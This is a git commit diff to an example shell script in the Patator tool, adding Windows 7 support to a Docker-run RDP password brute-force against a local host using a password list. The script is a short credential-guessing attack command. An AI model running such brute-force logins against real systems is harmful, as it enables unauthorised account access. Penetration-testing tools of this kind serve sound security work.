45b507bb5772ebde9673bc18e15867e2081b4f40
Häxxi Häxxinen <32751905+haxxinen@users.noreply.github.com>
2019-10-26 14:01:19 +0200

    RDP bruteforce example Win7 support.

--- patator/examples/rdp.sh
+++ patator/examples/rdp.sh
@@ -3,10 +3,11 @@
 
 pass='/tmp/pass.txt'
 ip='127.0.0.1'
-ignore='LOGON_FAILURE'
+ignore='ERRCONNECT_AUTHENTICATION_FAILED' # Win7
+# ignore='LOGON_FAILURE'
 # ignore='ERRCONNECT_LOGON_FAILURE' # Win10/WinServer16
 
 docker run --rm -it -v $pass:/F0 \
 -v /tmp/.X11-unix:/tmp/.X11-unix -e DISPLAY=unix$DISPLAY \
-patator rdp_login host=$ip user='Administrator' password=FILE0 0=/F0 \
+patator rdp_login host=$ip user="$user" password=FILE0 0=/F0 \
 -x ignore:fgrep="$ignore" -t 5
